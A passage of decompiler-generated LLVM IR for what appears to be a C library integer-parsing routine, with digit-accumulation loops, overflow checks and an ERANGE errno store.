  %v0_804f6f354 = phi i32 [ -1, %dec_label_pc_804f6d2 ], [ %v10_804f6e5, %bb ]
  %v4_804f6e8 = icmp eq i32 %v2_804faec, 0
  br i1 %v4_804f6e8, label %bb108, label %bb107

bb107:                                            ; preds = %bb106
  %v5_804f6e8 = lshr i32 -1, %v2_804faec
  store i32 %v5_804f6e8, i32* %edx.global-to-local, align 4
  br label %bb108

bb108:                                            ; preds = %bb106, %bb107
  %v0_804f6ef = phi i32 [ -1, %bb106 ], [ %v5_804f6e8, %bb107 ]
  %v2_804f6ea = and i32 %v4_804f6b2, 32
  %v3_804f6ea = icmp eq i32 %v2_804f6ea, 0
  br i1 %v3_804f6ea, label %dec_label_pc_804f6f3, label %dec_label_pc_804f6ef

dec_label_pc_804f6ef:                             ; preds = %bb108
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f6f3

dec_label_pc_804f6f3:                             ; preds = %bb108, %dec_label_pc_804f6ef
  %v0_804f6f3 = phi i32 [ %v0_804f6f354, %bb108 ], [ %v0_804f6ef, %dec_label_pc_804f6ef ]
  %v0_804f6f7 = phi i32 [ %v0_804f6ef, %bb108 ], [ 0, %dec_label_pc_804f6ef ]
  %v4_804f742156 = zext i8 %stack_var_-21.1.lcssa to i32
  %v11_804f747158 = icmp ult i32 %v4_804f742156, %v4_804f697
  %v1_804f74e163 = icmp eq i1 %v11_804f747158, false
  br i1 %v1_804f74e163, label %dec_label_pc_804f939, label %dec_label_pc_804f754.lr.ph

dec_label_pc_804f754.lr.ph:                       ; preds = %dec_label_pc_804f6f3
  %v8_804f715 = sub nsw i32 32, %v2_804faec
  br label %dec_label_pc_804f754

dec_label_pc_804f700:                             ; preds = %dec_label_pc_804f770
  %v1_804f700 = inttoptr i32 %v3_804f777 to i8*
  %v2_804f700 = load i8, i8* %v1_804f700, align 1
  %v3_804f700 = zext i8 %v2_804f700 to i32
  store i32 %v3_804f700, i32* @ebp, align 4
  %v1_804f703 = add i32 %v3_804f777, 1
  store i32 %v1_804f703, i32* %v2_804f527, align 4
  br label %dec_label_pc_804f709

dec_label_pc_804f709:                             ; preds = %dec_label_pc_804f77f, %dec_label_pc_804f700
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_804f715 = load i32, i32* @edi, align 4
  %v0_804f718.pre = load i32, i32* @esi, align 4
  br i1 %v6_804f6e5, label %dec_label_pc_804f709._crit_edge, label %bb109

bb109:                                            ; preds = %dec_label_pc_804f709
  %v7_804f715 = shl i32 %v0_804f715, %v2_804faec
  %v9_804f715 = lshr i32 %v0_804f718.pre, %v8_804f715
  %v10_804f715 = or i32 %v9_804f715, %v7_804f715
  br label %dec_label_pc_804f709._crit_edge

dec_label_pc_804f709._crit_edge:                  ; preds = %dec_label_pc_804f709, %bb109
  %v0_804f73c63 = phi i32 [ %v10_804f715, %bb109 ], [ %v0_804f715, %dec_label_pc_804f709 ]
  br i1 %v4_804f6e8, label %bb111, label %bb110

bb110:                                            ; preds = %dec_label_pc_804f709._crit_edge
  %v5_804f718 = shl i32 %v0_804f718.pre, %v2_804faec
  br label %bb111

bb111:                                            ; preds = %dec_label_pc_804f709._crit_edge, %bb110
  %v0_804f71f = phi i32 [ %v0_804f718.pre, %dec_label_pc_804f709._crit_edge ], [ %v5_804f718, %bb110 ]
  br i1 %v3_804f6ea, label %dec_label_pc_804f723, label %dec_label_pc_804f71f

dec_label_pc_804f71f:                             ; preds = %bb111
  br label %dec_label_pc_804f723

dec_label_pc_804f723:                             ; preds = %bb111, %dec_label_pc_804f71f
  %v0_804f73c = phi i32 [ %v0_804f73c63, %bb111 ], [ %v0_804f71f, %dec_label_pc_804f71f ]
  %v0_804f733 = phi i32 [ %v0_804f71f, %bb111 ], [ 0, %dec_label_pc_804f71f ]
  %v2_804f733 = or i32 %v0_804f733, %v4_804f742167
  store i32 %v2_804f733, i32* @esi, align 4
  %v0_804f735 = load i32, i32* @ebp, align 4
  %v1_804f735 = add i32 %v0_804f735, ptrtoint (i8** @global_var_8054601.384 to i32)
  %v2_804f735 = inttoptr i32 %v1_804f735 to i8*
  %v3_804f735 = load i8, i8* %v2_804f735, align 1
  %v4_804f735 = zext i8 %v3_804f735 to i32
  store i32 %v0_804f73c, i32* @edi, align 4
  %v11_804f747 = icmp ult i32 %v4_804f735, %v4_804f697
  %v1_804f74e = icmp eq i1 %v11_804f747, false
  br i1 %v1_804f74e, label %dec_label_pc_804f939, label %dec_label_pc_804f754

dec_label_pc_804f754:                             ; preds = %dec_label_pc_804f754.lr.ph, %dec_label_pc_804f723
  %v4_804f742167 = phi i32 [ %v4_804f742156, %dec_label_pc_804f754.lr.ph ], [ %v4_804f735, %dec_label_pc_804f723 ]
  %stack_var_-21.2166 = phi i8 [ %stack_var_-21.1.lcssa, %dec_label_pc_804f754.lr.ph ], [ %v3_804f735, %dec_label_pc_804f723 ]
  %v0_804f754165 = phi i32 [ 0, %dec_label_pc_804f754.lr.ph ], [ %v0_804f73c, %dec_label_pc_804f723 ]
  %v0_804f760164 = phi i32 [ %v0_804f6e3.lcssa, %dec_label_pc_804f754.lr.ph ], [ %v2_804f733, %dec_label_pc_804f723 ]
  %v10_804f754 = icmp ult i32 %v0_804f754165, %v0_804f6f7
  br i1 %v10_804f754, label %dec_label_pc_804f770, label %dec_label_pc_804f75a

dec_label_pc_804f75a:                             ; preds = %dec_label_pc_804f754
  %v15_804f754 = icmp eq i32 %v0_804f754165, %v0_804f6f7
  br i1 %v15_804f754, label %dec_label_pc_804f760, label %dec_label_pc_804f8c4.preheader

dec_label_pc_804f760:                             ; preds = %dec_label_pc_804f75a
  %tmp234 = icmp ugt i32 %v0_804f760164, %v0_804f6f3
  br i1 %tmp234, label %dec_label_pc_804f8c4.preheader, label %dec_label_pc_804f770

dec_label_pc_804f770:                             ; preds = %dec_label_pc_804f760, %dec_label_pc_804f754
  store i32 %v4_804f520, i32* %edx.global-to-local, align 4
  %v3_804f777 = load i32, i32* %v2_804f527, align 4
  %v4_804f77a = load i32, i32* %v3_804f52a, align 4
  %v10_804f77a = icmp ult i32 %v3_804f777, %v4_804f77a
  br i1 %v10_804f77a, label %dec_label_pc_804f700, label %dec_label_pc_804f77f

dec_label_pc_804f77f:                             ; preds = %dec_label_pc_804f770
  store i64 %arg1, i64* %stack_var_-124, align 8
  %v2_804f782 = call i32 @__shgetc(i32 %v4_804f520)
  store i32 %v2_804f782, i32* @ebp, align 4
  br label %dec_label_pc_804f709

dec_label_pc_804f790:                             ; preds = %dec_label_pc_804f790.lr.ph, %dec_label_pc_804f7b6
  %stack_var_-21.3151 = phi i8 [ %stack_var_-21.0, %dec_label_pc_804f790.lr.ph ], [ %v3_804f7bd, %dec_label_pc_804f7b6 ]
  %v0_804f7e3150 = phi i32 [ 0, %dec_label_pc_804f790.lr.ph ], [ %v2_804f7cb, %dec_label_pc_804f7b6 ]
  %tmp235 = icmp ult i32 %v0_804f7e3150, 119304647
  br i1 %tmp235, label %dec_label_pc_804f798, label %dec_label_pc_804f7dc

dec_label_pc_804f798:                             ; preds = %dec_label_pc_804f790
  store i32 %v4_804f520, i32* %edx.global-to-local, align 4
  %v3_804f79f = load i32, i32* %v2_804f527, align 4
  %v4_804f7a2 = load i32, i32* %v3_804f52a, align 4
  %v10_804f7a2 = icmp ult i32 %v3_804f79f, %v4_804f7a2
  %v1_804f7a5 = icmp eq i1 %v10_804f7a2, false
  br i1 %v1_804f7a5, label %dec_label_pc_804fa01, label %dec_label_pc_804f7ab

dec_label_pc_804f7ab:                             ; preds = %dec_label_pc_804f798
  %v1_804f7ad = inttoptr i32 %v3_804f79f to i8*
  %v2_804f7ad = load i8, i8* %v1_804f7ad, align 1
  %v3_804f7ad = zext i8 %v2_804f7ad to i32
  store i32 %v3_804f7ad, i32* %edx.global-to-local, align 4
  %v1_804f7b0 = add i32 %v3_804f79f, 1
  store i32 %v1_804f7b0, i32* %v2_804f527, align 4
  %v0_804f7bd.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f7b6

dec_label_pc_804f7b6:                             ; preds = %dec_label_pc_804fa01, %dec_label_pc_804f7ab
  %v0_804f7bd = phi i32 [ %v2_804fa04, %dec_label_pc_804fa01 ], [ %v0_804f7bd.pre, %dec_label_pc_804f7ab ]
  %v1_804f7bd = add i32 %v0_804f7bd, ptrtoint (i8** @global_var_8054601.384 to i32)
  %v2_804f7bd = inttoptr i32 %v1_804f7bd to i8*
  %v3_804f7bd = load i8, i8* %v2_804f7bd, align 1
  %v4_804f7bd = zext i8 %v3_804f7bd to i32
  store i32 %v4_804f7bd, i32* %edx.global-to-local, align 4
  %v1_804f7c4 = load i32, i32* @ebx, align 4
  %v4_804f7c4 = mul i32 %v1_804f7c4, %v4_804f697
  %v1_804f7cb = load i32, i32* @esi, align 4
  %v2_804f7cb = add i32 %v1_804f7cb, %v4_804f7c4
  store i32 %v2_804f7cb, i32* @ebx, align 4
  store i32 %v4_804f7bd, i32* @esi, align 4
  %v11_804f7d3 = icmp ult i32 %v4_804f7bd, %v4_804f697
  br i1 %v11_804f7d3, label %dec_label_pc_804f790, label %dec_label_pc_804f7dc

dec_label_pc_804f7dc:                             ; preds = %dec_label_pc_804f7b6, %dec_label_pc_804f790, %dec_label_pc_804f7ce.preheader
  %v0_804f7e3.lcssa = phi i32 [ 0, %dec_label_pc_804f7ce.preheader ], [ %v0_804f7e3150, %dec_label_pc_804f790 ], [ %v2_804f7cb, %dec_label_pc_804f7b6 ]
  %stack_var_-21.3.lcssa = phi i8 [ %stack_var_-21.0, %dec_label_pc_804f7ce.preheader ], [ %stack_var_-21.3151, %dec_label_pc_804f790 ], [ %v3_804f7bd, %dec_label_pc_804f7b6 ]
  store i32 %v4_804f697, i32* %edx.global-to-local, align 4
  store i32 %v0_804f7e3.lcssa, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  %v4_804f7f5132 = zext i8 %stack_var_-21.3.lcssa to i32
  %v7_804f7fa134 = icmp ult i32 %v4_804f7f5132, %v4_804f697
  %v1_804f800139 = icmp eq i1 %v7_804f7fa134, false
  br i1 %v1_804f800139, label %dec_label_pc_804f939, label %dec_label_pc_804f806.lr.ph

dec_label_pc_804f806.lr.ph:                       ; preds = %dec_label_pc_804f7dc
  %v3_804f84b = and i64 %stack_var_8.1, 4294967295
  br label %dec_label_pc_804f806

dec_label_pc_804f806:                             ; preds = %dec_label_pc_804f806.lr.ph, %dec_label_pc_804f886
  %v4_804f7f5141 = phi i32 [ %v4_804f7f5132, %dec_label_pc_804f806.lr.ph ], [ %v4_804f89d, %dec_label_pc_804f886 ]
  %stack_var_-21.4140 = phi i8 [ %stack_var_-21.3.lcssa, %dec_label_pc_804f806.lr.ph ], [ %v3_804f89d, %dec_label_pc_804f886 ]
  store i32 %v4_804f697, i32* %edx.global-to-local, align 4
  store i64 -1, i64* %stack_var_-124, align 8
  %v9_804f825 = call i64 @__udivdi3(i64 -1, i64 -1)
  %v10_804f825 = trunc i64 %v9_804f825 to i32
  %v0_804f82a = load i32, i32* @edi, align 4
  %v1_804f82a = load i32, i32* @edx, align 4
  %tmp236 = icmp ugt i32 %v0_804f82a, %v1_804f82a
  br i1 %tmp236, label %dec_label_pc_804f8c4.preheader, label %dec_label_pc_804f832

dec_label_pc_804f832:                             ; preds = %dec_label_pc_804f806
  %v7_804f82a = icmp ult i32 %v0_804f82a, %v1_804f82a
  %v0_804f84b.pre = load i32, i32* @esi, align 4
  br i1 %v7_804f82a, label %dec_label_pc_804f83c, label %dec_label_pc_804f834

dec_label_pc_804f834:                             ; preds = %dec_label_pc_804f832
  %tmp237 = icmp ugt i32 %v0_804f84b.pre, %v10_804f825
  br i1 %tmp237, label %dec_label_pc_804f8c4.preheader, label %dec_label_pc_804f83c

dec_label_pc_804f83c:                             ; preds = %dec_label_pc_804f834, %dec_label_pc_804f832
  store i32 %v4_804f7f5141, i32* @ebx, align 4
  %v4_804f848 = mul i32 %v0_804f82a, %v4_804f697
  %v2_804f84b = zext i32 %v0_804f84b.pre to i64
  %v4_804f84b = mul nuw i64 %v2_804f84b, %v3_804f84b
  %v5_804f84b = trunc i64 %v4_804f84b to i32
  %v6_804f84b = udiv i64 %v4_804f84b, 4294967296
  %v7_804f84b = trunc i64 %v6_804f84b to i32
  store i32 0, i32* @esi, align 4
  %v2_804f84f = add i32 %v7_804f84b, %v4_804f848
  store i32 %v2_804f84f, i32* @ebp, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  store i32 %v5_804f84b, i32* @edi, align 4
  %v7_804f858 = icmp eq i32 %v2_804f84f, -1
  %v1_804f85c = sub nuw nsw i32 -1, %v4_804f7f5141
  br i1 %v7_804f858, label %dec_label_pc_804f860, label %dec_label_pc_804f866

dec_label_pc_804f860:                             ; preds = %dec_label_pc_804f83c
  br i1 true, label %dec_label_pc_804f862, label %dec_label_pc_804f8c4.preheader

dec_label_pc_804f862:                             ; preds = %dec_label_pc_804f860
  %tmp238 = icmp ugt i32 %v5_804f84b, %v1_804f85c
  br i1 %tmp238, label %dec_label_pc_804f8c4.preheader, label %dec_label_pc_804f866

dec_label_pc_804f8c4.preheader:                   ; preds = %dec_label_pc_804f862, %dec_label_pc_804f834, %dec_label_pc_804f806, %dec_label_pc_804f760, %dec_label_pc_804f75a, %dec_label_pc_804f860, %dec_label_pc_804f9da
  %stack_var_-21.5.ph = phi i8 [ %v3_804f9da, %dec_label_pc_804f9da ], [ %stack_var_-21.4140, %dec_label_pc_804f862 ], [ %stack_var_-21.4140, %dec_label_pc_804f860 ], [ %stack_var_-21.4140, %dec_label_pc_804f834 ], [ %stack_var_-21.4140, %dec_label_pc_804f806 ], [ %stack_var_-21.2166, %dec_label_pc_804f760 ], [ %stack_var_-21.2166, %dec_label_pc_804f75a ]
  %stack_var_-32.5.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_804f9da ], [ %stack_var_-32.4, %dec_label_pc_804f862 ], [ %stack_var_-32.4, %dec_label_pc_804f860 ], [ %stack_var_-32.4, %dec_label_pc_804f834 ], [ %stack_var_-32.4, %dec_label_pc_804f806 ], [ %stack_var_-32.4, %dec_label_pc_804f760 ], [ %stack_var_-32.4, %dec_label_pc_804f75a ]
  %stack_var_8.2.off0.ph = phi i32 [ %v4_804f672, %dec_label_pc_804f9da ], [ %v4_804f697, %dec_label_pc_804f862 ], [ %v4_804f697, %dec_label_pc_804f860 ], [ %v4_804f697, %dec_label_pc_804f834 ], [ %v4_804f697, %dec_label_pc_804f806 ], [ %v4_804f697, %dec_label_pc_804f760 ], [ %v4_804f697, %dec_label_pc_804f75a ]
  %v4_804f8c4124 = zext i8 %stack_var_-21.5.ph to i32
  %v11_804f8c9126 = icmp ult i32 %v4_804f8c4124, %stack_var_8.2.off0.ph
  %v1_804f8d0131 = icmp eq i1 %v11_804f8c9126, false
  br i1 %v1_804f8d0131, label %dec_label_pc_804fb05, label %dec_label_pc_804f8d6

dec_label_pc_804f866:                             ; preds = %dec_label_pc_804f862, %dec_label_pc_804f83c
  %v3_804f86d = load i32, i32* %v2_804f527, align 4
  %v4_804f870 = load i32, i32* %v3_804f52a, align 4
  %v10_804f870 = icmp ult i32 %v3_804f86d, %v4_804f870
  %v1_804f873 = icmp eq i1 %v10_804f870, false
  br i1 %v1_804f873, label %dec_label_pc_804f9f0, label %dec_label_pc_804f879

dec_label_pc_804f879:                             ; preds = %dec_label_pc_804f866
  %v1_804f879 = inttoptr i32 %v3_804f86d to i8*
  %v2_804f879 = load i8, i8* %v1_804f879, align 1
  %v3_804f879 = zext i8 %v2_804f879 to i32
  store i32 %v3_804f879, i32* %edx.global-to-local, align 4
  %v1_804f87c = add i32 %v3_804f86d, 1
  store i32 %v1_804f87c, i32* %v2_804f527, align 4
  %v0_804f882 = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f886

dec_label_pc_804f886:                             ; preds = %dec_label_pc_804f9f0, %dec_label_pc_804f879
  %storemerge = phi i32 [ %v2_804f9f3, %dec_label_pc_804f9f0 ], [ %v0_804f882, %dec_label_pc_804f879 ]
  %v0_804f886 = load i32, i32* @ebx, align 4
  %v0_804f888 = load i32, i32* @esi, align 4
  %v1_804f88a = load i32, i32* @edi, align 4
  %v2_804f88a = add i32 %v1_804f88a, %v0_804f886
  %v7_804f88a = icmp ult i32 %v2_804f88a, %v0_804f886
  %v1_804f88c = load i32, i32* @ebp, align 4
  %v3_804f88c = zext i1 %v7_804f88a to i32
  %v4_804f88c = add i32 %v1_804f88c, %v0_804f888
  %v5_804f88c = add i32 %v3_804f88c, %v4_804f88c
  store i32 %v2_804f88a, i32* @esi, align 4
  store i32 %v5_804f88c, i32* @edi, align 4
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  %v1_804f89d = add i32 %storemerge, ptrtoint (i8** @global_var_8054601.384 to i32)
  %v2_804f89d = inttoptr i32 %v1_804f89d to i8*
  %v3_804f89d = load i8, i8* %v2_804f89d, align 1
  %v4_804f89d = zext i8 %v3_804f89d to i32
  store i32 %v4_804f89d, i32* %edx.global-to-local, align 4
  %v7_804f7fa = icmp ult i32 %v4_804f89d, %v4_804f697
  %v1_804f800 = icmp eq i1 %v7_804f7fa, false
  br i1 %v1_804f800, label %dec_label_pc_804f939, label %dec_label_pc_804f806

dec_label_pc_804f8b0:                             ; preds = %dec_label_pc_804f8d6
  %v1_804f8b0 = inttoptr i32 %v3_804f8dd to i8*
  %v2_804f8b0 = load i8, i8* %v1_804f8b0, align 1
  %v3_804f8b0 = zext i8 %v2_804f8b0 to i32
  store i32 %v3_804f8b0, i32* %edx.global-to-local, align 4
  %v1_804f8b3 = add i32 %v3_804f8dd, 1
  store i32 %v1_804f8b3, i32* %v2_804f527, align 4
  %v0_804f8b9.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f8b9

dec_label_pc_804f8b9:                             ; preds = %dec_label_pc_804f8e5, %dec_label_pc_804f8b0
  %v0_804f8b9 = phi i32 [ %v2_804f8e8, %dec_label_pc_804f8e5 ], [ %v0_804f8b9.pre, %dec_label_pc_804f8b0 ]
  %v1_804f8b9 = add i32 %v0_804f8b9, ptrtoint (i8** @global_var_8054601.384 to i32)
  %v2_804f8b9 = inttoptr i32 %v1_804f8b9 to i8*
  %v3_804f8b9 = load i8, i8* %v2_804f8b9, align 1
  %v4_804f8b9 = zext i8 %v3_804f8b9 to i32
  store i32 %v4_804f8b9, i32* %edx.global-to-local, align 4
  %v11_804f8c9 = icmp ult i32 %v4_804f8b9, %stack_var_8.2.off0.ph
  %v1_804f8d0 = icmp eq i1 %v11_804f8c9, false
  br i1 %v1_804f8d0, label %dec_label_pc_804fb05, label %dec_label_pc_804f8d6

dec_label_pc_804f8d6:                             ; preds = %dec_label_pc_804f8c4.preheader, %dec_label_pc_804f8b9
  %v3_804f8dd = load i32, i32* %v2_804f527, align 4
  %v4_804f8e0 = load i32, i32* %v3_804f52a, align 4
  %v10_804f8e0 = icmp ult i32 %v3_804f8dd, %v4_804f8e0
  br i1 %v10_804f8e0, label %dec_label_pc_804f8b0, label %dec_label_pc_804f8e5

dec_label_pc_804f8e5:                             ; preds = %dec_label_pc_804f8d6
  store i64 %arg1, i64* %stack_var_-124, align 8
  %v2_804f8e8 = call i32 @__shgetc(i32 %v4_804f520)
  store i32 %v2_804f8e8, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f8b9

dec_label_pc_804f8f1:                             ; preds = %dec_label_pc_804f920.preheader, %dec_label_pc_804f917
  %v1_804f920209 = phi i32 [ %v1_804f920, %dec_label_pc_804f917 ], [ %v1_804f920198, %dec_label_pc_804f920.preheader ]
  %v0_804f920208 = phi i32 [ %v0_804f91e, %dec_label_pc_804f917 ], [ %v0_804f687, %dec_label_pc_804f920.preheader ]
  %v0_804f928207 = phi i32 [ %v4_804f91a, %dec_label_pc_804f917 ], [ 0, %dec_label_pc_804f920.preheader ]
  %tmp239 = icmp ult i32 %v0_804f928207, 429496729
  br i1 %tmp239, label %dec_label_pc_804f8f9, label %dec_label_pc_804f928

dec_label_pc_804f8f9:                             ; preds = %dec_label_pc_804f8f1
  store i32 %v4_804f520, i32* %edx.global-to-local, align 4
  %v3_804f900 = load i32, i32* %v2_804f527, align 4
  %v4_804f903 = load i32, i32* %v3_804f52a, align 4
  %v10_804f903 = icmp ult i32 %v3_804f900, %v4_804f903
  %v1_804f906 = icmp eq i1 %v10_804f903, false
  br i1 %v1_804f906, label %dec_label_pc_804fa10, label %dec_label_pc_804f90c

dec_label_pc_804f90c:                             ; preds = %dec_label_pc_804f8f9
  %v1_804f90e = inttoptr i32 %v3_804f900 to i8*
  %v2_804f90e = load i8, i8* %v1_804f90e, align 1
  %v3_804f90e = zext i8 %v2_804f90e to i32
  store i32 %v3_804f90e, i32* %edx.global-to-local, align 4
  %v1_804f911 = add i32 %v3_804f900, 1
  store i32 %v1_804f911, i32* %v2_804f527, align 4
  %v0_804f91e.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f917

dec_label_pc_804f917:                             ; preds = %dec_label_pc_804fa10, %dec_label_pc_804f90c
  %v0_804f91e = phi i32 [ %v2_804fa13, %dec_label_pc_804fa10 ], [ %v0_804f91e.pre, %dec_label_pc_804f90c ]
  %v0_804f917 = load i32, i32* @ebx, align 4
  %v0_804f91a = load i32, i32* @ebp, align 4
  %v2_804f91a = mul i32 %v0_804f917, 10
  %v3_804f91a = add i32 %v2_804f91a, -48
  %v4_804f91a = add i32 %v3_804f91a, %v0_804f91a
  store i32 %v4_804f91a, i32* @ebx, align 4
  store i32 %v0_804f91e, i32* @ebp, align 4
  %v1_804f920 = add i32 %v0_804f91e, -48
  %tmp240 = icmp ult i32 %v1_804f920, 10
  br i1 %tmp240, label %dec_label_pc_804f8f1, label %dec_label_pc_804f928

dec_label_pc_804f928:                             ; preds = %dec_label_pc_804f917, %dec_label_pc_804f8f1, %dec_label_pc_804f920.preheader
  %v0_804f928.lcssa = phi i32 [ 0, %dec_label_pc_804f920.preheader ], [ %v0_804f928207, %dec_label_pc_804f8f1 ], [ %v4_804f91a, %dec_label_pc_804f917 ]
  %v0_804f920.lcssa = phi i32 [ %v0_804f687, %dec_label_pc_804f920.preheader ], [ %v0_804f920208, %dec_label_pc_804f8f1 ], [ %v0_804f91e, %dec_label_pc_804f917 ]
  %v1_804f920.lcssa = phi i32 [ %v1_804f920198, %dec_label_pc_804f920.preheader ], [ %v1_804f920209, %dec_label_pc_804f8f1 ], [ %v1_804f920, %dec_label_pc_804f917 ]
  store i32 %v0_804f928.lcssa, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  %tmp241 = icmp ugt i32 %v1_804f920.lcssa, 9
  br i1 %tmp241, label %dec_label_pc_804f939, label %dec_label_pc_804f9bc

dec_label_pc_804f939:                             ; preds = %dec_label_pc_804f928, %dec_label_pc_804fa7d, %dec_label_pc_804f6f3, %dec_label_pc_804f723, %dec_label_pc_804f7dc, %dec_label_pc_804f886, %dec_label_pc_804fb05, %dec_label_pc_804f9cd
  %stack_var_-21.6 = phi i8 [ %tmp88, %dec_label_pc_804f9cd ], [ %stack_var_-21.5.lcssa, %dec_label_pc_804fb05 ], [ %stack_var_-21.3.lcssa, %dec_label_pc_804f7dc ], [ %v3_804f89d, %dec_label_pc_804f886 ], [ %stack_var_-21.1.lcssa, %dec_label_pc_804f6f3 ], [ %v3_804f735, %dec_label_pc_804f723 ], [ %tmp88, %dec_label_pc_804fa7d ], [ %tmp88, %dec_label_pc_804f928 ]
  %stack_var_-32.6 = phi i32 [ %stack_var_-32.3, %dec_label_pc_804f9cd ], [ %stack_var_-32.5., %dec_label_pc_804fb05 ], [ %stack_var_-32.4, %dec_label_pc_804f7dc ], [ %stack_var_-32.4, %dec_label_pc_804f886 ], [ %stack_var_-32.4, %dec_label_pc_804f6f3 ], [ %stack_var_-32.4, %dec_label_pc_804f723 ], [ %stack_var_-32.3, %dec_label_pc_804fa7d ], [ %stack_var_-32.3, %dec_label_pc_804f928 ]
  store i32 %v4_804f520, i32* %edx.global-to-local, align 4
  %v3_804f940 = load i32, i32* %v3_804f52a, align 4
  %v1_804f943 = icmp eq i32 %v3_804f940, 0
  br i1 %v1_804f943, label %dec_label_pc_804f94b, label %dec_label_pc_804f947

dec_label_pc_804f947:                             ; preds = %dec_label_pc_804f939
  %v3_804f947 = load i32, i32* %v2_804f527, align 4
  %v4_804f947 = add i32 %v3_804f947, -1
  store i32 %v4_804f947, i32* %v2_804f527, align 4
  br label %dec_label_pc_804f94b

dec_label_pc_804f94b:                             ; preds = %dec_label_pc_804f939, %dec_label_pc_804f947
  %v0_804f94b = load i32, i32* @edi, align 4
  %v10_804f94b = icmp ult i32 %v0_804f94b, %tmp97
  %v15_804f94b = icmp eq i32 %v0_804f94b, %tmp97
  br i1 %v10_804f94b, label %dec_label_pc_804f94b.dec_label_pc_804f98b_crit_edge, label %dec_label_pc_804f951

dec_label_pc_804f94b.dec_label_pc_804f98b_crit_edge: ; preds = %dec_label_pc_804f94b
  %v1_804f996.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f98b

dec_label_pc_804f951:                             ; preds = %dec_label_pc_804f94b
  br i1 %v15_804f94b, label %dec_label_pc_804f953, label %dec_label_pc_804f959

dec_label_pc_804f953:                             ; preds = %dec_label_pc_804f951
  %v0_804f953 = load i32, i32* @esi, align 4
  %v10_804f953 = icmp ult i32 %v0_804f953, %arg4
  br i1 %v10_804f953, label %dec_label_pc_804f98b, label %dec_label_pc_804f959

dec_label_pc_804f959:                             ; preds = %dec_label_pc_804f951, %dec_label_pc_804f953
  %v1_804f95d = urem i32 %arg4, 2
  %v5_804f960 = or i32 %stack_var_-32.6, %v1_804f95d
  %v6_804f960 = icmp eq i32 %v5_804f960, 0
  br i1 %v6_804f960, label %dec_label_pc_804fb8d, label %dec_label_pc_804f970

dec_label_pc_804f970:                             ; preds = %dec_label_pc_804f959
  br i1 %v15_804f94b, label %dec_label_pc_804f985, label %dec_label_pc_804f972

dec_label_pc_804f972:                             ; preds = %dec_label_pc_804f985, %dec_label_pc_804f970
  %v0_804f972 = load i64, i64* %stack_var_-124, align 8
  %v1_804f972 = trunc i64 %v0_804f972 to i32
  %v2_804f972 = call i32 @__errno_location(i32 %v1_804f972)
  %v1_804f977 = inttoptr i32 %v2_804f972 to i32*
  store i32 34, i32* %v1_804f977, align 4
  br label %dec_label_pc_804f5e5

dec_label_pc_804f985:                             ; preds = %dec_label_pc_804f970
  %v0_804f985 = load i32, i32* @esi, align 4
  %tmp242 = icmp ugt i32 %v0_804f985, %arg4
  br i1 %tmp242, label %dec_label_pc_804f972, label %dec_label_pc_804f98b

dec_label_pc_804f98b:                             ; preds = %dec_label_pc_804f985, %dec_label_pc_804f94b.dec_label_pc_804f98b_crit_edge, %dec_label_pc_804f953
  %v1_804f996 = phi i32 [ %v1_804f996.pre, %dec_label_pc_804f94b.dec_label_pc_804f98b_crit_edge ], [ %v0_804f985, %dec_label_pc_804f985 ], [ %v0_804f953, %dec_label_pc_804f953 ]
  %v2_804f993 = ashr i32 %stack_var_-32.6, 31
  %v2_804f996 = xor i32 %v1_804f996, %stack_var_-32.6
  %v2_804f99a = xor i32 %v0_804f94b, %v2_804f993
  %v5_804f9a0 = sub i32 %v2_804f996, %stack_var_-32.6
  %v10_804f9a0 = icmp ult i32 %v2_804f996, %stack_var_-32.6
  %v6_804f9ac = zext i1 %v10_804f9a0 to i32
  %tmp243 = icmp slt i32 %stack_var_-32.6, 0
  %v2_804f993.neg = zext i1 %tmp243 to i32
  %v7_804f9ac = add i32 %v2_804f99a, %v2_804f993.neg
  %v8_804f9ac = add i32 %v7_804f9ac, %v6_804f9ac
  store i32 %v8_804f9ac, i32* @edx, align 4
  store i32 %v0_804f4f2, i32* @esi, align 4
  ret i32 %v5_804f9a0

dec_label_pc_804f9bc:                             ; preds = %dec_label_pc_804f928, %dec_label_pc_804fa7d
  %v1_804fa29193 = phi i32 [ %v8_804fa8c, %dec_label_pc_804fa7d ], [ 0, %dec_label_pc_804f928 ]
  %v0_804f9c4192 = phi i32 [ %v1_804fa81, %dec_label_pc_804fa7d ], [ %v1_804f920.lcssa, %dec_label_pc_804f928 ]
  %v0_804f9da190 = phi i32 [ %v0_804fa81, %dec_label_pc_804fa7d ], [ %v0_804f920.lcssa, %dec_label_pc_804f928 ]
  %tmp244 = icmp ult i32 %v1_804fa29193, 429496730
  br i1 %tmp244, label %dec_label_pc_804fa1f, label %dec_label_pc_804f9cd

dec_label_pc_804f9cd:                             ; preds = %dec_label_pc_804f9bc, %dec_label_pc_804fa55, %dec_label_pc_804fa5b, %dec_label_pc_804faa1
  %v1_804f9cd = add i32 %v0_804f9da190, 134563329
  %v2_804f9cd = inttoptr i32 %v1_804f9cd to i8*
  %v3_804f9cd = load i8, i8* %v2_804f9cd, align 1
  %tmp245 = icmp ult i8 %v3_804f9cd, 10
  br i1 %tmp245, label %dec_label_pc_804f9da, label %dec_label_pc_804f939

dec_label_pc_804f9da:                             ; preds = %dec_label_pc_804f9cd
  %v3_804f9da = load i8, i8* %v2_804f9cd, align 1
  %v4_804f9da = zext i8 %v3_804f9da to i32
  store i32 %v4_804f9da, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f8c4.preheader

dec_label_pc_804f9f0:                             ; preds = %dec_label_pc_804f866
  store i64 %arg1, i64* %stack_var_-124, align 8
  %v2_804f9f3 = call i32 @__shgetc(i32 %v4_804f520)
  br label %dec_label_pc_804f886

dec_label_pc_804fa01:                             ; preds = %dec_label_pc_804f798
  store i64 %arg1, i64* %stack_var_-124, align 8
  %v2_804fa04 = call i32 @__shgetc(i32 %v4_804f520)
